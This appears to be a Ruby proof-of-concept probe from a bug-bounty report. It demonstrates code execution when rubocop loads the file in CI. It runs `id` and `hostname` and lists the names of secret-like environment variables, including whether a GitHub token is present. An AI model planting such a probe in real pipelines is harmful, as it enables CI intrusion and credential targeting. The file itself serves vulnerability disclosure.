# SECURITY POC PROBE (authorized bug-bounty test, DailyPay BBP).
# Benign: proves code executes at rubocop load-time via `require:`.
# Prints runner identity + env var NAMES ONLY (never values). No exfiltration,
# no token use, no repo writes. Remove on triage.
marker = "HTTPIGEON-RUBOCOP-REQUIRE-RCE-POC-20261001"
puts "=== #{marker} ==="
puts "proof_code_exec: rubocop loaded and executed ./poc_probe.rb top-level code"
puts "runner_id: #{`id`.strip rescue 'n/a'}"
puts "hostname: #{`hostname`.strip rescue 'n/a'}"
puts "event_name: #{ENV['GITHUB_EVENT_NAME']}"
puts "repository: #{ENV['GITHUB_REPOSITORY']}"
puts "actor: #{ENV['GITHUB_ACTOR']}"
puts "token_present: #{ENV.key?('GITHUB_TOKEN') ? 'yes' : 'no'}"
# NAMES ONLY — demonstrates which secrets would be reachable, without leaking any value.
secretish = ENV.keys.select { |k| k =~ /TOKEN|SECRET|KEY|PASS|CRED/i }.sort
puts "secretish_env_NAMES_only: #{secretish.inspect}"
puts "=== #{marker} END ==="
